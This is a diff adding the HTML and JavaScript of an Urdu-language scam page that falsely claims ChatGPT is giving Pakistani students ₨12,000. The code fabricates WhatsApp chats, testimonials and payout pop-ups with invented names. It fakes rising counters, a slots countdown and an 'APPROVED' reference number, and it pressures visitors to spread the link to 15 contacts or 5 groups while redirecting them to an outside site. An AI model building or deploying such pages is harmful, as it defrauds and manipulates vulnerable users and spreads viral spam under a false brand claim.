+        <div class="wa-b">بھائی میرے اکاؤنٹ میں آ گئے! 🤑 صرف 2 گھنٹے لگے!<div class="wa-t">10:45 AM ✓✓</div></div>
+        <div class="wa-b s">میں نے بھی کر لیا 🎉 سب کو بتاؤ!<div class="wa-t">10:48 AM ✓✓</div></div>
+        <div class="wa-b">میری بہن نے بھی کیا — اسے بھی مل گئے! 💯<div class="wa-t">11:02 AM ✓✓</div></div>
+      </div>
+    </div>
+
+    <!-- TESTIMONIALS -->
+    <div class="sec">⭐ کامیاب طلباء</div>
+    <div class="cv"><div class="cr" id="carRail"></div></div>
+
+  </div>
+</div><!-- /mainPage -->
+
+<!-- ══ FIRST VISIT CONFIRM SCREEN ══ -->
+<div id="confirmScreen">
+  <div class="pw">
+    <div class="form-card">
+      <div style="padding:26px 20px;text-align:center;">
+        <div class="confirm-ring">✅</div>
+        <h2 class="ur" style="font-size:1.2rem;margin-bottom:4px;">درخواست موصول ہو گئی!</h2>
+        <p style="font-size:.73rem;color:var(--muted);">Ref # <span id="refNo" style="color:var(--g1);font-weight:700;font-family:'Playfair Display',serif;"></span></p>
+        <div class="stamp">✓ APPROVED</div>
+        <div class="confirm-msg">
+          <p class="ur" style="font-size:.93rem;color:var(--sub);margin:0;">
+            ہمیں آپکی ریکوئسٹ موصول ہو چکی ہے، ہم کچھ دیر میں آپ کے نمبر پر آپکو آگاہ کر دیں گے۔
+          </p>
+        </div>
+
+        <!-- RANDOM ADS -->
+        <div class="sec" style="margin-top:16px;">🎯 آپ کے لیے خصوصی آفرز</div>
+        <div class="ads-grid" id="adsGrid"></div>
+        <div id="adsBanner"></div>
+
+        <div class="share-box" style="margin-top:14px;">
+          <p class="ur" style="font-size:.85rem;color:#92400e;font-weight:700;margin-bottom:5px;">⚡ منظوری تیز کریں!</p>
+          <p class="ur" style="font-size:.78rem;color:#92400e;margin:0;">
+            جلدی منظوری کے لیے یہ لنک <strong>15 واٹس ایپ کانٹیکٹس</strong> یا <strong>5 گروپس</strong> میں شیئر کریں
+          </p>
+        </div>
+        <button class="wa-btn ur" onclick="firstVisitRedirect()">📲 15 واٹس ایپ کانٹیکٹس کو شیئر کریں</button>
+        <button class="wa-btn teal ur" onclick="firstVisitRedirect()">👥 5 گروپس میں شیئر کریں</button>
+        <p style="font-size:.65rem;color:var(--muted);margin-top:8px;">شیئر کرنے کے بعد آپ منظوری کی فہرست میں شامل ہو جائیں گے</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ SECOND VISIT SCREEN — WhatsApp now works ══ -->
+<div id="alreadyScreen">
+  <div class="pw">
+    <div style="text-align:center;padding:28px 0 18px;">
+      <div style="font-size:3.2rem;margin-bottom:10px;">✅</div>
+      <h2 class="ur" style="font-size:1.2rem;color:var(--g1);margin-bottom:6px;">آپ کی درخواست زیر غور ہے!</h2>
+      <p class="ur" style="font-size:.82rem;color:var(--sub);">منظوری کے لیے ابھی شیئر کریں</p>
+    </div>
+    <div class="form-card">
+      <div style="padding:20px;text-align:center;">
+        <div class="stamp" style="animation:stampIt .4s .1s cubic-bezier(.34,1.56,.64,1) forwards;">PENDING</div>
+        <div class="confirm-msg" style="margin-top:14px;">
+          <p class="ur" style="font-size:.88rem;color:var(--sub);margin:0;">آپ کی درخواست موصول ہو چکی ہے۔ منظوری کے لیے نیچے دیے گئے بٹن سے لنک شیئر کریں۔</p>
+        </div>
+
+        <div class="share-prog-wrap">
+          <div class="share-prog-info">
+            <span class="ur">شیئرنگ پیشرفت</span>
+            <span id="shareCount">0 / 15</span>
+          </div>
+          <div class="share-prog-track">
+            <div class="share-prog-fill" id="shareBar"></div>
+          </div>
+        </div>
+
+        <div class="share-box" style="margin-top:14px;">
+          <p class="ur" style="font-size:.85rem;color:#92400e;font-weight:700;margin-bottom:5px;">📲 ابھی شیئر کریں!</p>
+          <p class="ur" style="font-size:.78rem;color:#92400e;margin:0;"><strong>15 واٹس ایپ کانٹیکٹس</strong> یا <strong>5 گروپس</strong> میں شیئر کریں</p>
+        </div>
+
+        <button class="wa-btn ur" onclick="realShare('contacts')">📲 واٹس ایپ کانٹیکٹس کو شیئر کریں</button>
+        <button class="wa-btn teal ur" onclick="realShare('groups')">👥 گروپس میں شیئر کریں</button>
+        <p style="font-size:.63rem;color:var(--muted);margin-top:10px;">شیئر کرنے کے بعد 24 گھنٹے میں رقم آ جائے گی</p>
+      </div>
+    </div>
+
+    <div style="margin-top:20px;">
+      <div class="sec">⭐ جن کو مل چکا ہے</div>
+      <div class="cv"><div class="cr" id="carRail2"></div></div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  Important Note: This website is not affiliated and linked with chatGPT or OpenAI in any way
+</footer>
+
+<script>
+// ════════ STATE ════════
+// localStorage persists even after redirect/browser close
+// Flow:
+//   fresh visit  → cgpt_back = null  → show main form
+//   share btn    → cgpt_back = '1'   → redirect to mentorship site
+//   comes back   → cgpt_back = '1'   → show second-visit WA share screen
+
+const REDIRECT_KEY = 'cgpt_back';
+const isSecondVisit = localStorage.getItem(REDIRECT_KEY) === '1';
+
+// ════════ THEME ════════
+let dark = false;
+function toggleTheme(){
+  dark = !dark;
+  document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+  document.getElementById('themeBtn').textContent = dark ? '☀️' : '🌙';
+}
+
+// ════════ PAGE INIT ════════
+window.addEventListener('DOMContentLoaded', () => {
+  if(isSecondVisit){
+    showScreen('alreadyScreen');
+    buildCarousel('carRail2');
+  } else {
+    showScreen('mainPage');
+    buildCarousel('carRail');
+  }
+});
+
+function showScreen(id){
+  ['mainPage','confirmScreen','alreadyScreen'].forEach(s => {
+    const el = document.getElementById(s);
+    if(el) el.style.display = s === id ? 'block' : 'none';
+  });
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+// ════════ FORM SUBMIT → show confirm (no redirect yet) ════════
+let formDone = false;
+function handleSubmit(e){
+  e.preventDefault();
+  formDone = true;
+  document.getElementById('warnModal').style.display = 'none';
+  document.getElementById('refNo').textContent = 'PKT-2026-' + Math.floor(Math.random()*90000+10000);
+  showScreen('confirmScreen');
+  buildAds();
+  launchConfetti();
+}
+
+// ════════ SHARE BUTTON on FIRST VISIT → mark + redirect (no WA yet) ════════
+function firstVisitRedirect(){
+  localStorage.setItem(REDIRECT_KEY, '1'); // persist so next visit detects it
+  window.location.href = 'https://mentorship.dilawarpro.com';
+}
+
+// ════════ SECOND VISIT — real WhatsApp share ════════
+let shareNum = 0;
+function realShare(type){
+  shareNum = Math.min(shareNum + 5, 15);
+  const pct = (shareNum / 15) * 100;
+  const bar = document.getElementById('shareBar');
+  const cnt = document.getElementById('shareCount');
+  if(bar) bar.style.width = pct + '%';
+  if(cnt) cnt.textContent = shareNum + ' / 15';
+
+  const txt = type === 'contacts'
+    ? '🎉 ChatGPT پاکستانی طلباء کو ₨12,000 دے رہا ہے!\nمیں نے apply کر لیا — آپ بھی جلدی کریں!\n👇\n' + window.location.href
+    : '⚡ ابھی apply کریں — صرف چند سلاٹ باقی!\n💰 ChatGPT ₨12,000 دے رہا ہے!\n' + window.location.href;
+
+  window.open('https://api.whatsapp.com/send?text=' + encodeURIComponent(txt), '_blank');
+}
+
+// ════════ TOASTS ════════
+const TOASTS = [
+  {t:'a',e:'👦',n:'احمد — لاہور',    m:'نے ابھی apply کیا! ✅'},
+  {t:'a',e:'👩',n:'ثنا — کراچی',     m:'نے رجسٹریشن مکمل کی! 🎉'},
+  {t:'a',e:'🧑',n:'بلال — فیصل آباد',m:'کی درخواست موصول ہوئی! 📩'},
+  {t:'a',e:'👧',n:'عائشہ — پشاور',   m:'نے ابھی apply کیا! ✅'},
+  {t:'a',e:'👦',n:'فہد — ملتان',     m:'نے رجسٹریشن کروائی! 🎓'},
+  {t:'a',e:'👩',n:'مریم — حیدرآباد', m:'نے درخواست دی! ✅'},
+  {t:'a',e:'🧔',n:'زید — راولپنڈی',  m:'نے ابھی apply کیا! ✅'},
+  {t:'a',e:'👧',n:'نور — سیالکوٹ',   m:'کی درخواست موصول ہوئی! 📩'},
+  {t:'w',e:'💸',n:'حمزہ — لاہور',    m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 🤑'},
+  {t:'w',e:'🎉',n:'سارہ — کراچی',    m:'کو <span class="t-amt">₨12,000</span> مل گئے! 💚'},
+  {t:'w',e:'💰',n:'عمر — اسلام آباد',m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 😍'},
+  {t:'w',e:'🤑',n:'رضا — گوجرانوالہ',m:'کو <span class="t-amt">₨12,000</span> JazzCash پر آ گئے!'},
+  {t:'w',e:'🎊',n:'فاطمہ — ملتان',   m:'کو <span class="t-amt">₨12,000</span> EasyPaisa پر ملے!'},
+  {t:'w',e:'💸',n:'عادل — کوئٹہ',    m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 🎊'},
+];
+const shuffled = [...TOASTS].sort(()=>Math.random()-.5);
+let tIdx = 0;
+
+function beep(){
+  try{
+    const A=new(window.AudioContext||window.webkitAudioContext)();
+    const o=A.createOscillator(),g=A.createGain();
+    o.connect(g);g.connect(A.destination);
+    o.frequency.value=820;g.gain.setValueAtTime(.1,A.currentTime);
+    g.gain.exponentialRampToValueAtTime(.001,A.currentTime+.22);
+    o.start();o.stop(A.currentTime+.22);
+  }catch(e){}
+}
+
+function showToast(){
+  const d = shuffled[tIdx % shuffled.length]; tIdx++;
+  const shelf = document.getElementById('toastShelf');
+  const el = document.createElement('div');
+  el.className = 'toast-card' + (d.t==='w' ? ' gold' : '');
+  const mins = Math.floor(Math.random()*6)+1;
+  el.innerHTML = `
+    <div class="t-x" onclick="dismissToast(this)">✕</div>
+    <div class="t-avi${d.t==='w'?' gold':''}">${d.e}</div>
+    <div style="flex:1;min-width:0;">
+      <div class="t-name ur">${d.n}</div>
+      <div class="t-msg ur">${d.m}</div>
+      <div class="t-time">${mins} منٹ پہلے</div>
+    </div>`;
+  shelf.prepend(el);
+  while(shelf.children.length > 3) shelf.removeChild(shelf.lastChild);
+  beep();
+  const timer = setTimeout(() => dismissToast(el.querySelector('.t-x')), 5500);
+  el.dataset.timer = timer;
+}
+
+function dismissToast(xBtn){
+  const card = xBtn.closest ? xBtn.closest('.toast-card') : xBtn;
+  if(!card || card.classList.contains('hiding')) return;
+  clearTimeout(parseInt(card.dataset.timer));
+  card.classList.add('hiding');
+  setTimeout(()=>card.remove(), 340);
+}
+
+setTimeout(()=>{
+  showToast();
+  (function loop(){ setTimeout(()=>{showToast();loop();}, Math.random()*3200+3200); })();
+}, 2000);
+
+// ════════ LIVE COUNTERS ════════
+let vc=12847, lv=312, tot=47381, paid=23841;
+setInterval(()=>{
+  vc   += Math.floor(Math.random()*6)-1;
+  lv   += Math.floor(Math.random()*4)-1;
+  tot  += Math.floor(Math.random()*3);
+  paid += Math.floor(Math.random()*2);
+  const e=(id,v)=>{const el=document.getElementById(id);if(el)el.textContent=v;};
+  e('viewCount', vc.toLocaleString());
+  e('sTotal',    tot.toLocaleString());
+  e('sLive',     Math.max(lv,190));
+  e('sPaid',     paid.toLocaleString());
+  e('liveNum',   Math.max(lv,190));
+}, 2800);
+
+let slots=500;
+setInterval(()=>{
+  if(slots>10){ slots-=Math.floor(Math.random()*3)+1; document.getElementById('slotsLeft').textContent=slots; }
+}, 5500);
+
+// hero countdown
+let heroSec = 7*3600+42*60+59;
+setInterval(()=>{
+  if(heroSec<=0)return; heroSec--;
+  document.getElementById('cdH').textContent=String(Math.floor(heroSec/3600)).padStart(2,'0');
+  document.getElementById('cdM').textContent=String(Math.floor((heroSec%3600)/60)).padStart(2,'0');
+  document.getElementById('cdS').textContent=String(heroSec%60).padStart(2,'0');
+},1000);
+
+// ════════ WARNING MODAL ════════
+setTimeout(()=>{
+  if(formDone || isSecondVisit) return;
+  document.getElementById('modalSlots').textContent = Math.floor(Math.random()*30)+20;
+  document.getElementById('warnModal').style.display = 'flex';
+}, 14000);
+function closeModal(){
+  document.getElementById('warnModal').style.display = 'none';
+  document.getElementById('mainForm')?.scrollIntoView({behavior:'smooth',block:'center'});
+}
+
+// ════════ TESTIMONIALS ════════
+const testis=[
+  {e:'👦',av:'#0d8a6a',n:'حمزہ احمد',c:'لاہور',b:'JazzCash',tx:'یقین نہیں آ رہا تھا لیکن واقعی 12 ہزار آ گئے! 🤩'},
+  {e:'👩',av:'#c2185b',n:'ثنا ملک',c:'کراچی',b:'EasyPaisa',tx:'میری سہیلی نے بتایا — پیسے مل گئے! 💚'},
+  {e:'🧔',av:'#1565c0',n:'عمر فاروق',c:'اسلام آباد',b:'Meezan',tx:'100% legit! میرے 3 دوستوں کو بھی مل گئے! 🙌'},
+  {e:'👧',av:'#6a1b9a',n:'عائشہ خان',c:'پشاور',b:'HBL Mobile',tx:'رات apply کیا صبح پیسے تھے! 🎊'},
+  {e:'👦',av:'#e65100',n:'فہد علی',c:'ملتان',b:'SadaPay',tx:'Alhamdulillah! ₨12,000 مل گئے! 🎉'},
+  {e:'👩',av:'#00796b',n:'مریم حسین',c:'فیصل آباد',b:'UBL',tx:'بہت آسان — سب apply کریں! 😊'},
+];
+function buildCarousel(railId){
+  const rail=document.getElementById(railId); if(!rail)return;
+  [...testis,...testis].forEach(t=>{
+    const el=document.createElement('div'); el.className='tt';
+    el.innerHTML=`
+      <div style="display:flex;align-items:flex-start;gap:9px;margin-bottom:9px;">
+        <div class="tt-av" style="background:${t.av};">${t.e}</div>
+        <div style="flex:1"><div class="ur" style="font-weight:600;font-size:.8rem;color:var(--text)">${t.n} — ${t.c}</div><div class="tt-stars">★★★★★</div></div>
+        <div class="tt-chip">₨12K ✅</div>
+      </div>
+      <p class="ur" style="font-size:.74rem;color:var(--sub);line-height:2;">${t.tx}</p>
+      <div style="font-size:.62rem;color:var(--g1);margin-top:5px;">via ${t.b} · ✅ Verified</div>`;
+    rail.appendChild(el);
+  });
+}
+
+// ════════ ADS ════════
+const ADS=[
+  {emoji:'📱',bg:'linear-gradient(135deg,#667eea,#764ba2)',title:'JazzCash Super Account',sub:'5% منافع روزانہ!',cta:'ابھی کھولیں →'},
+  {emoji:'🏦',bg:'linear-gradient(135deg,#f093fb,#f5576c)',title:'EasyPaisa Gold Card',sub:'Zero فیس — فوری',cta:'Apply کریں →'},
+  {emoji:'📚',bg:'linear-gradient(135deg,#4facfe,#00f2fe)',title:'Online Courses 70% Off',sub:'AI, Coding سیکھیں',cta:'دیکھیں →'},
+  {emoji:'🎓',bg:'linear-gradient(135deg,#43e97b,#38f9d7)',title:'Virtual University',sub:'داخلہ ابھی شروع',cta:'Apply کریں →'},
+  {emoji:'💊',bg:'linear-gradient(135deg,#fa709a,#fee140)',title:'Health Insurance',sub:'پورا خاندان cover',cta:'جانیں →'},
+  {emoji:'🛒',bg:'linear-gradient(135deg,#a18cd1,#fbc2eb)',title:'Daraz Sale 80% Off',sub:'آج صرف محدود وقت',cta:'خریداری →'},
+  {emoji:'💻',bg:'linear-gradient(135deg,#fccb90,#d57eeb)',title:'Laptop Installments',sub:'بغیر سود آسان قسطیں',cta:'دیکھیں →'},
+  {emoji:'🏠',bg:'linear-gradient(135deg,#a1c4fd,#c2e9fb)',title:'Apna Ghar Scheme',sub:'سرکاری اسکیم فوری',cta:'رجسٹر کریں →'},
+];
+const BANNERS=[
+  {e:'🎰',bg:'linear-gradient(90deg,#f7971e,#ffd200)',title:'Spin & Win ₨50,000!',sub:'ہر روز 1000 انعام — آج کھیلیں'},
+  {e:'📡',bg:'linear-gradient(90deg,#11998e,#38ef7d)',title:'PTCL Fiber Free Install',sub:'پہلے 3 مہینے آدھی قیمت'},
+  {e:'✈️',bg:'linear-gradient(90deg,#4776e6,#8e54e9)',title:'Dubai Tour Package',sub:'صرف ₨89,999 سب شامل'},
+];
+function buildAds(){
+  const grid=document.getElementById('adsGrid');
+  const banner=document.getElementById('adsBanner');
+  const picked=[...ADS].sort(()=>Math.random()-.5).slice(0,4);
+  picked.forEach(ad=>{
+    const el=document.createElement('div'); el.className='ad-tile';
+    el.innerHTML=`
+      <div class="ad-lbl">Ad</div>
+      <div class="ad-img" style="background:${ad.bg}">${ad.emoji}</div>
+      <div class="ad-body">
+        <div class="ad-title">${ad.title}</div>
+        <div class="ad-sub">${ad.sub}</div>
+        <div class="ad-cta">${ad.cta}</div>
+      </div>`;
+    grid.appendChild(el);
+  });
+  const b=BANNERS[Math.floor(Math.random()*BANNERS.length)];
+  banner.innerHTML=`
+    <div class="ad-banner">
+      <div class="ad-lbl">Ad</div>
+      <div class="ad-banner-in" style="background:${b.bg}">
+        <span style="font-size:1.9rem;">${b.e}</span>
+        <div>
+          <div style="font-weight:700;color:#fff;font-size:.88rem;">${b.title}</div>
+          <div style="color:rgba(255,255,255,.85);font-size:.73rem;">${b.sub}</div>
+        </div>
+        <div style="margin-right:auto;background:rgba(255,255,255,.22);color:#fff;border-radius:8px;padding:5px 11px;font-size:.7rem;font-weight:600;white-space:nowrap;">دیکھیں →</div>
+      </div>
+    </div>`;
+}
+
+// ════════ CONFETTI ════════
+function launchConfetti(){
+  const cols=['#05c48a','#ffd700','#ff6b6b','#4fc3f7','#ce93d8','#80cbc4','#ffb74d','#f06292'];
+  const layer=document.getElementById('cfti');
+  for(let i=0;i<100;i++){
+    const p=document.createElement('div'); p.className='cp';
+    p.style.cssText=`left:${Math.random()*100}vw;background:${cols[Math.floor(Math.random()*cols.length)]};width:${Math.random()*9+5}px;height:${Math.random()*9+5}px;border-radius:${Math.random()>.5?'50%':'3px'};animation-delay:${Math.random()*1.5}s;animation-duration:${Math.random()*1.5+2.5}s;`;
+    layer.appendChild(p);
+    setTimeout(()=>p.remove(), 4800);
+  }
+}
+</script>
+</body>
+</html>
